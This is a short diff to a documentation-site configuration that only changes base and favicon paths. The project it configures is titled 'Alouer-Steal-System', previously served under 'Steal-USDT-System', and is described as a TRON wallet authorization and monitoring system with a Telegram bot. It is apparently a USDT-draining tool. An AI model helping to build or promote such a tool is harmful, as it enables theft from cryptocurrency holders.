@@ -4,10 +4,10 @@ export default defineConfig({
   title: 'Alouer-Steal-System',
   description: 'TRON 链钱包授权管理系统 - 多链钱包监控、智能合约交互、Telegram 机器人',
   lang: 'zh-CN',
-  base: '/Steal-USDT-System/',
+  base: '/',
 
   head: [
-    ['link', { rel: 'icon', href: '/Steal-USDT-System/favicon.ico' }],
+    ['link', { rel: 'icon', href: '/favicon.ico' }],
     ['meta', { name: 'theme-color', content: '#0a0a0a' }],
   ],
 
